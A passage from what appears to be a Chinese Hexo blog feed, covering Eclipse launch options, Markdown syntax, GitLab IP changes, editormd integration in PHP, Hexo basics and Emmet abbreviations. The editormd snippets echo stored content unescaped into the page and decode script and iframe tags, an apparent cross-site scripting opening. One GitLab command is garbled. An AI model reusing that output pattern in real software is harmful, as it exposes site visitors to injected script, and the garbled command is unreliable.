<p>描述：以开发状态启动Eclipse，这会添加所有指定的路径作为每个插件的Classpath</p>
<p>举例：例如eclipse -dev<br>bin，会将产生在bin目录下的所有类加载到类路径中，这在开发插件时非常有用</p>
<p> </p>
<p>-nosplash</p>
<p>描述：指定启动时不显示闪屏</p>
<p>举例：eclipse -nosplash</p>
<p> </p>
<p>-vm [jre path]</p>
<p>描述：指定启动时所使用的Java虚拟机</p>
<p>举例：例如要使用自己的Java虚拟机，则eclipse -vm <br>D:&#x2F;j2sdk1.4.2_04&#x2F;jre&#x2F;bin&#x2F;java.exe，这样还有一个好处，就是可以开启一个Console，能够显示控制台信息，当然若使用eclipse<br>-vm D:&#x2F;j2sdk1.4.2_04&#x2F;jre&#x2F;bin&#x2F;javaw.exe则不会再显示控制台</p>
<p> </p>
<p>-vmargs [Java VM arguments]</p>
<p>描述：指定启动时要使用的Java虚拟机参数</p>
<p>举例：例如要指定使用的内存容量，则eclipse -vmargs “-Xms256m -Xmx1024m”</p>
<p>注：此参数一定要放在所有参数变量的最后面</p>
<p><a href="/ide/eclipse/jvmconfig.php" title="Eclipse里配置内存大小">vmargs<br>配制内存详解</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Eclipse</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown基本语法</title>
    <url>/blog/tools/markdown/base/</url>
    <content><![CDATA[<h3 id="标题设置"><a href="#标题设置" class="headerlink" title="标题设置"></a>标题设置</h3><p>在Markdown当中设置标题，有两种方式：</p>
<p>第一种：通过在文字下方添加“&#x3D;”和“-”，他们分别表示一级标题和二级标题。<br>第二种：在文字开头加上 “#”，通过“#”数量表示几级标题。（一共只有1~6级标题，1级标题字体最大）</p>
<p>###块注释（blockquote）</p>
<p>通过在文字开头添加“&gt;”表示块注释。（当&gt;和文字之间添加五个blank时，块注释的文字会有变化。）</p>
<h3 id="斜体"><a href="#斜体" class="headerlink" title="斜体"></a>斜体</h3><p>将需要设置为斜体的文字两端使用1个“*”或者“_”夹起来</p>
<h3 id="粗体"><a href="#粗体" class="headerlink" title="粗体"></a>粗体</h3><p>将需要设置为斜体的文字两端使用2个“*”或者“_”夹起来</p>
<h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p>在文字开头添加(<em>, +, and -)实现无序列表。但是要注意在(</em>, +, and -)和文字之间需要添加空格。（建议：一个文档中只是用一种无序列表的表示方式）</p>
<h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><p>使用数字后面跟上句号。（还要有空格）</p>
<h3 id="链接（Links）"><a href="#链接（Links）" class="headerlink" title="链接（Links）"></a>链接（Links）</h3><p>Markdown中有两种方式，实现链接，分别为内联方式和引用方式。</p>
<p>内联方式：</p>
<pre><code>This is an [example link](http://example.com/).
</code></pre>
<p>引用方式：</p>
<pre><code>I get 10 times more traffic from [Google][1] than from [Yahoo][2] or [MSN][3].
[1]: http://google.com/        &quot;Google&quot;
[2]: http://search.yahoo.com/  &quot;Yahoo Search&quot;
[3]: http://search.msn.com/    &quot;MSN Search&quot;
</code></pre>
<h3 id="图片（Images）"><a href="#图片（Images）" class="headerlink" title="图片（Images）"></a>图片（Images）</h3><p>图片的处理方式和链接的处理方式，非常的类似。</p>
<p>内联方式：</p>
<pre><code>![alt text](/path/to/img.jpg &quot;Title&quot;)
</code></pre>
<p>引用方式：</p>
<pre><code>![alt text][id]
[id]: /path/to/img.jpg &quot;Title&quot;
</code></pre>
<h3 id="代码（HTML中所谓的Code）"><a href="#代码（HTML中所谓的Code）" class="headerlink" title="代码（HTML中所谓的Code）"></a>代码（HTML中所谓的Code）</h3><p>实现方式有两种：</p>
<p>第一种：简单文字出现一个代码框。使用<code>&lt;blockquote&gt;</code>。（<code>不是单引号而是左上角的ESC下面~中的</code>）<br>第二种：大片文字需要实现代码框。使用Tab和四个空格。</p>
<h3 id="脚注（footnote）"><a href="#脚注（footnote）" class="headerlink" title="脚注（footnote）"></a>脚注（footnote）</h3><p>实现方式如下：</p>
<pre><code>hello[^hello]
[^hello]: hi
</code></pre>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>GitLab如何更换服务器IP</title>
    <url>/blog/tools/git/gitlibchip/</url>
    <content><![CDATA[<p>修改external_url参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi /etc/gitlab/gitlab.rb</span><br></pre></td></tr></table></figure>

<p>将external_url修改成现在的ip端口,形式<code>http://xxhost.com</code></p>
<p>启用配制：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gitlab-ctl reconfigure</span><br></pre></td></tr></table></figure>

<p>启动服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gitlab?sudo?gitlab?start</span><br></pre></td></tr></table></figure>

<p>相关命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//启动</span><br><span class="line">sudo gitlab-ctl start</span><br><span class="line">//查看运行状态</span><br><span class="line">sudo gitlab-ctl status</span><br><span class="line">//停止</span><br><span class="line">sudo gitlab-ctl stop</span><br><span class="line">//查看错误信息</span><br><span class="line">sudo gitlab-ctl tail</span><br><span class="line">//保存配置</span><br><span class="line">sudo gitlab-ctl reconfigure</span><br></pre></td></tr></table></figure>

<p>postgresql是无法通过kill?杀死进程，需要使用<code>gitlab-ctl?restart?postgresql</code>或者?<code>gitlab-ctl?stop?postgresql</code>?重启或者停止然后再启动</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>GIT</category>
      </categories>
      <tags>
        <tag>GIT</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown 在线编辑器editormd使用笔记</title>
    <url>/blog/tools/markdown/editormd/</url>
    <content><![CDATA[<h2 id="集成editormd编辑器"><a href="#集成editormd编辑器" class="headerlink" title="集成editormd编辑器"></a>集成editormd编辑器</h2><p>下载editormd开源包里面的样例文件：</p>
<p><a href="http://iteedu.com/editormd/examples/index.html">http://iteedu.com/editormd/examples/index.html</a></p>
<p>在网页中添加如下代码。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;editormd&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span><span class="meta">&lt;?php ;echo $o[&#x27;content&#x27;]; ?&gt;</span>&amp;lt/textarea&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/include/js/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/editormd/editormd.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	$(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">var</span> editor = <span class="title function_">editormd</span>(<span class="string">&quot;editormd&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">			path : <span class="string">&quot;../editormd/lib/&quot;</span> <span class="comment">// Autoload modules mode, codemirror, marked... dependents libs path</span></span></span><br><span class="line"><span class="language-javascript">		&#125;);</span></span><br><span class="line"><span class="language-javascript">	&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果还想用编辑器样式，还要引入样式文件：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/editormd/examples/css/style.css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/editormd/css/editormd.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="用editormd显示markdown文件"><a href="#用editormd显示markdown文件" class="headerlink" title="用editormd显示markdown文件"></a>用editormd显示markdown文件</h2><p>这是我在php中输出的集成代码，$fcontent是从数据加载的markdown文本。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div id=&quot;editormd-view&quot;&gt;</span></span><br><span class="line"><span class="string">		&lt;textarea style=&quot;display:none;&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fcontent</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&amp;lt/textarea&gt;&lt;/div&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;script src=&quot;/editormd/lib/marked.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script src=&quot;/editormd/lib/prettify.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script src=&quot;/editormd/lib/raphael.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script src=&quot;/editormd/lib/underscore.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script src=&quot;/editormd/lib/sequence-diagram.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script src=&quot;/editormd/lib/flowchart.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script src=&quot;/editormd/lib/jquery.flowchart.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script src=&quot;/editormd/editormd.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;script type=&quot;text/javascript&quot;&gt;</span></span><br><span class="line"><span class="string">	$(function() &#123;</span></span><br><span class="line"><span class="string">		var testEditormdView;</span></span><br><span class="line"><span class="string">		editormdView = editormd.markdownToHTML(&quot;editormd-view&quot;, &#123;</span></span><br><span class="line"><span class="string">			htmlDecode      : &quot;style,script,iframe&quot;,  // you can filter tags decode</span></span><br><span class="line"><span class="string">			emoji           : true,</span></span><br><span class="line"><span class="string">			taskList        : true,</span></span><br><span class="line"><span class="string">			tex             : true,  // 默认不解析</span></span><br><span class="line"><span class="string">			flowChart       : true,  // 默认不解析</span></span><br><span class="line"><span class="string">			sequenceDiagram : true,  // 默认不解析</span></span><br><span class="line"><span class="string">		&#125;);</span></span><br><span class="line"><span class="string">	&#125;);</span></span><br><span class="line"><span class="string">&lt;/script&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
        <tag>神器</tag>
      </tags>
  </entry>
  <entry>
    <title>【hexo】静态网站建站神器-hexo</title>
    <url>/blog/tools/hexo/hexobase/</url>
    <content><![CDATA[<h2 id="hexo为什么是神器"><a href="#hexo为什么是神器" class="headerlink" title="hexo为什么是神器"></a>hexo为什么是神器</h2><p>很多人都想搭建个人博客记录自己的点点滴滴，但租空间要花钱会阻挡好多人。</p>
<p>想做个方便点的还要有数据库支持，装个wordpress什么的才行。</p>
<p>如果想找个便宜的存储空间没有数据库，那做静态网页也是个麻烦事。</p>
<p>特别是想换个主题，要把所有界面改一遍，是非常困难的。</p>
<p>从MVC结构讲，主题是博客的View，数据是博客的Model，还差一个生成静态页面的Controller。</p>
<p>hexo就是静态博客的Contrller，可以通过M生成V，这个工作是在个人电脑完成的，所以存储空间不用数据库。</p>
<p>特别是Github提供了page服务后，可以用Github做免费存储空间，只要把个人域名绑定一下就可以了。</p>
<p>这样个人博客的成本就是买域名的成本，如果不想买用Github的默认域名也可以。</p>
<p>不过建议还是买一个，一年几十的费用，开始两年可能还非常便宜。</p>
<h2 id="hexo原理"><a href="#hexo原理" class="headerlink" title="hexo原理"></a>hexo原理</h2><p>hexo的Model是用的markdown，可以看网站中的相关文章。</p>
<p>hexo主要功能是将markdown文章加工成指定主题样式的html文件。</p>
<p>hexo的nexT主题是非常棒的，本网站就是用这个主题。</p>
<p>hexo可以将生成好的静态html用git发布到Git服务上，如Github或Gitee。</p>
<p>Gitee绑定域名是要花钱的，所以本网站是发布到Github上的。</p>
<p>hexo是一个插件化的程序，用的NodeJS，本身语言是javascript，也是大众化语言。</p>
<h2 id="hexo命令"><a href="#hexo命令" class="headerlink" title="hexo命令"></a>hexo命令</h2><p>创建新网站</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ hexo init [folder]</span><br></pre></td></tr></table></figure>

<p> 新建一个网站。如果没有设置 <code>folder</code> ，Hexo 默认在目前的文件夹建立网站。 </p>
<p>新建文章，虽然有命令，但我还是喜欢自己建markdown来创建：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 【hexo】静态网站建站神器-hexo</span><br><span class="line">date: 2019-06-29 17:15:39</span><br><span class="line">tags: </span><br><span class="line"> - hexo</span><br><span class="line"> - 神器</span><br><span class="line">categories: </span><br><span class="line"> - 工具</span><br><span class="line">---</span><br><span class="line">这里可以写文章内容</span><br></pre></td></tr></table></figure>

<p>生成文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo generate</span><br><span class="line">hexo g </span><br></pre></td></tr></table></figure>

<p>启用本地服务，查看效果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo server</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p>部署生成的文件，需要配制好GIT</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo deploy</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<p>中文手册地址： <a href="https://hexo.io/zh-cn/docs/commands">https://hexo.io/zh-cn/docs/commands</a> </p>
<h2 id="hexo搜索功能"><a href="#hexo搜索功能" class="headerlink" title="hexo搜索功能"></a>hexo搜索功能</h2><p>hexo的<code>local search</code>插件可以提供搜索服务。</p>
<p>搜索服务是通过将文章的内容打包到一个文件，搜索时会下载到浏览器缓存起来，从其中查询文章。</p>
<p><code>local search</code>可以配制成只搜索文件标题，这样生成的搜索文件就特别小，几百篇文章的搜索文件才几十K。</p>
<p>本网站的搜索就是用的<code>local search</code>，亲测还是不错的。</p>
<h2 id="nexT对标签分类归档的支持"><a href="#nexT对标签分类归档的支持" class="headerlink" title="nexT对标签分类归档的支持"></a>nexT对标签分类归档的支持</h2><p>可以看官方配制：</p>
<p><a href="http://theme-next.iissnan.com/theme-settings.html">nexT主题配置</a></p>
<p>主要是要生成几个页面,以标签为例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ hexo new page tags</span><br></pre></td></tr></table></figure>

<p>文件内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: 标签</span><br><span class="line">date: 2014-12-22 12:39:04</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line">comments: false</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<h2 id="nexT对百度服务的支持"><a href="#nexT对百度服务的支持" class="headerlink" title="nexT对百度服务的支持"></a>nexT对百度服务的支持</h2><p>百度统计修改nexT配制文件<code>_config.yml</code>中的key:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Baidu Analytics ID</span><br><span class="line"></span><br><span class="line">baidu_analytics: this you baidutj key</span><br></pre></td></tr></table></figure>

<p>配制上在百度统计上检测一下网站是否配制成功。</p>
<p>链接提交可以将新文章自动推给百度，不用百度机器人来抓取了，修改配制文件中的key为true:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Enable baidu push so that the blog will push the url to baidu automatically which is very helpful for SEO</span><br><span class="line">baidu_push: true</span><br></pre></td></tr></table></figure>

<p>具体各种推送方式可以看百度的说明：</p>
<p><a href="https://ziyuan.baidu.com/linksubmit/index">百度链接提交</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>神器</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>前端开发必备神器Emmet使用指南</title>
    <url>/blog/tools/emment/emmentsyzn/</url>
    <content><![CDATA[<p>Emmet (前身为 Zen Coding) 是一个能大幅度提高前端开发效率的一个工具:</p>
<p>基本上，大多数的文本编辑器都会允许你存储和重用一些代码块，我们称之为”片段”。虽然片段能很好地推动你得生产力，但大多数的实现都有这样一个缺点：你必须先定义你得代码片段，并且不能再运行时进行拓展。</p>
<p>Emmet把片段这个概念提高到了一个新的层次：你可以设置CSS形式的能够动态被解析的表达式，然后根据你所输入的缩写来得到相应的内容。Emmet是很成熟的并且非常适用于编写HTML&#x2F;XML<br>和 CSS 代码的前端开发人员，但也可以用于编程语言。</p>
<h3 id="使用示例："><a href="#使用示例：" class="headerlink" title="使用示例："></a>使用示例：</h3><p><strong>在编辑器中输入缩写代码：</strong>ul&gt;li*5<br>，然后按下拓展键（默认为tab），即可得到代码片段：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>

<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>emmet的使用方法也非常简单，以Notepad++为例，直接在编辑器中输入HTML或CSS的代码的缩写，然后按Ctrl+E键就可以拓展为完整的代码片段。（如果与已有的快捷键有冲突的话，可以自行在编辑器中将拓展键设为其他快捷键）</p>
<h2 id="语法"><a href="#语法" class="headerlink" title="语法:"></a>语法:</h2><h4 id="后代：-gt"><a href="#后代：-gt" class="headerlink" title="后代：&gt;"></a>后代：&gt;</h4><p><strong>缩写</strong>：nav&gt;ul&gt;li</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;nav&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &lt;li&gt;&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">&lt;/nav&gt;</span><br></pre></td></tr></table></figure>

<h4 id="兄弟："><a href="#兄弟：" class="headerlink" title="兄弟：+"></a>兄弟：+</h4><p><strong>缩写</strong>：div+p+bq</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;&lt;/div&gt;</span><br><span class="line">&lt;p&gt;&lt;/p&gt;</span><br><span class="line">&lt;blockquote&gt;&lt;/blockquote&gt;</span><br></pre></td></tr></table></figure>

<h4 id="上级："><a href="#上级：" class="headerlink" title="上级：^"></a>上级：^</h4><p><strong>缩写</strong>：div+div&gt;p&gt;span+em^bq</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;p&gt;&lt;span&gt;&lt;/span&gt;&lt;em&gt;&lt;/em&gt;&lt;/p&gt;</span><br><span class="line">    &lt;blockquote&gt;&lt;/blockquote&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：div+div&gt;p&gt;span+em^^bq</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;p&gt;&lt;span&gt;&lt;/span&gt;&lt;em&gt;&lt;/em&gt;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;blockquote&gt;&lt;/blockquote&gt;</span><br></pre></td></tr></table></figure>

<h4 id="分组："><a href="#分组：" class="headerlink" title="分组：()"></a>分组：()</h4><p><strong>缩写</strong>：div&gt;(header&gt;ul&gt;li*2&gt;a)+footer&gt;p</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;header&gt;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">            &lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">            &lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">    &lt;/header&gt;</span><br><span class="line">    &lt;footer&gt;</span><br><span class="line">        &lt;p&gt;&lt;/p&gt;</span><br><span class="line">    &lt;/footer&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：(div&gt;dl&gt;(dt+dd)*3)+footer&gt;p</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;dl&gt;</span><br><span class="line">        &lt;dt&gt;&lt;/dt&gt;</span><br><span class="line">        &lt;dd&gt;&lt;/dd&gt;</span><br><span class="line">        &lt;dt&gt;&lt;/dt&gt;</span><br><span class="line">        &lt;dd&gt;&lt;/dd&gt;</span><br><span class="line">        &lt;dt&gt;&lt;/dt&gt;</span><br><span class="line">        &lt;dd&gt;&lt;/dd&gt;</span><br><span class="line">    &lt;/dl&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;footer&gt;</span><br><span class="line">    &lt;p&gt;&lt;/p&gt;</span><br><span class="line">&lt;/footer&gt;</span><br></pre></td></tr></table></figure>

<h4 id="乘法："><a href="#乘法：" class="headerlink" title="乘法：*"></a>乘法：*</h4><p><strong>缩写</strong>：ul&gt;li*5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>

<h4 id="自增符号："><a href="#自增符号：" class="headerlink" title="自增符号：$"></a>自增符号：$</h4><p><strong>缩写</strong>：ul&gt;li.item$*5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li class=&quot;item1&quot;&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;item2&quot;&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;item3&quot;&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;item4&quot;&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;item5&quot;&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：h$[title&#x3D;item$]{Header $}*3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h1 title=&quot;item1&quot;&gt;Header 1&lt;/h1&gt;</span><br><span class="line">&lt;h2 title=&quot;item2&quot;&gt;Header 2&lt;/h2&gt;</span><br><span class="line">&lt;h3 title=&quot;item3&quot;&gt;Header 3&lt;/h3&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：ul&gt;li.item$$$*5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li class=&quot;item001&quot;&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;item002&quot;&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;item003&quot;&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;item004&quot;&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;item005&quot;&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：ul&gt;li.item$@-*5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li class=&quot;item5&quot;&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;item4&quot;&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;item3&quot;&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;item2&quot;&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;item1&quot;&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：ul&gt;li.item$@3*5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li class=&quot;item3&quot;&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;item4&quot;&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;item5&quot;&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;item6&quot;&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;item7&quot;&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>

<h4 id="ID和类属性"><a href="#ID和类属性" class="headerlink" title="ID和类属性"></a>ID和类属性</h4><p><strong>缩写</strong>：#header</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&quot;header&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：.title</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div class=&quot;title&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：form#search.wide</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form id=&quot;search&quot; class=&quot;wide&quot;&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：p.class1.class2.class3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p class=&quot;class1 class2 class3&quot;&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<h4 id="自定义属性"><a href="#自定义属性" class="headerlink" title="自定义属性"></a>自定义属性</h4><p><strong>缩写</strong>：p[title&#x3D;&quot;Hello world&quot;]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p title=&quot;Hello world&quot;&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：td[rowspan&#x3D;2 colspan&#x3D;3 title]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;td rowspan=&quot;2&quot; colspan=&quot;3&quot; title=&quot;&quot;&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：[a&#x3D;&#39;value1&#39; b&#x3D;&quot;value2&quot;]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div a=&quot;value1&quot; b=&quot;value2&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<h4 id="文本："><a href="#文本：" class="headerlink" title="文本：{}"></a>文本：{}</h4><p><strong>缩写</strong>：a{Click me}</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;&quot;&gt;Click me&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：p&gt;{Click }+a{here}+{ to continue}</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;Click &lt;a href=&quot;&quot;&gt;here&lt;/a&gt; to continue&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<h4 id="隐式标签"><a href="#隐式标签" class="headerlink" title="隐式标签"></a>隐式标签</h4><p><strong>缩写</strong>：.class</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div class=&quot;class&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：em&gt;.class</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;em&gt;&lt;span class=&quot;class&quot;&gt;&lt;/span&gt;&lt;/em&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：ul&gt;.class</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li class=&quot;class&quot;&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：table&gt;.row&gt;.col</p>
